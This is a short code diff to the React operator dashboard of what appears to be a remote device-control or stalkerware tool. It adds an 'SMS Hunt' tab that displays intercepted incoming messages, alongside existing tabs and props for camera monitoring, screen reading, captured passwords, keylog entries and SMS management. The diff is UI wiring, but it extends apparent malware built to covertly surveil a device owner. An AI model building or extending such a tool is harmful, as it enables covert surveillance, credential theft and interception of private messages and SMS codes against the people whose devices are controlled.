@@ -16,6 +16,7 @@ const PermissionsTab = lazy(() => import('./PermissionsTab.jsx'));
 const NotificationsTab = lazy(() => import('./NotificationsTab.jsx'));
 const RecentActivityTab = lazy(() => import('./RecentActivityTab.jsx'));
 const TaskStudio = lazy(() => import('./TaskStudio.jsx'));
+const SmsHuntTab = lazy(() => import('./SmsHuntTab.jsx'));
 const PasswordsTab = lazy(() => import('./PasswordsTab.jsx'));
 const GestureTab = lazy(() => import('./GestureTab.jsx'));
 const SMSManagerTab = lazy(() => import('./SMSManagerTab.jsx'));
@@ -33,6 +34,7 @@ const TABS = [
   { id: 'camera_monitor', label: '📷 Camera Monitor' },
   { id: 'screen_reader',  label: '📺 Screen Reader' },
   { id: 'task_studio',    label: '🎬 Task Studio' },
+  { id: 'sms_hunt',       label: '🎯 SMS Hunt' },
   { id: 'passwords',      label: '🔑 Passwords' },
   { id: 'notifications',  label: '🔔 Notifications' },
   { id: 'sms_manager',    label: '💬 SMS Manager' },
@@ -63,7 +65,7 @@ function TabLoading() {
 export default function DeviceControl({
   device, sendCommand, results, pending, onBack,
   streamFrame, cameraFrame, send, keylogPushEntries, notifPushEntries,
-  activityAppEntries, screenReaderPushData, offlineRecordingVersion,
+  activityAppEntries, smsHuntEntries, screenReaderPushData, offlineRecordingVersion,
   serverLatency, deviceLatency, gcodeVersion, galleryStream, connected,
 }) {
   const [activeTab, setActiveTab]     = useState('control_center');
@@ -244,6 +246,14 @@ export default function DeviceControl({
           device={device}
           sendCommand={sendCommand}
           results={results}
+        />
+      </div>}
+
+      {loadedTabs.has('sms_hunt') && <div style={tabVisible('sms_hunt')}>
+        <SmsHuntTab
+          key={refreshKeys.sms_hunt}
+          device={device}
+          incomingMessages={smsHuntEntries || []}
         />
       </div>}
 
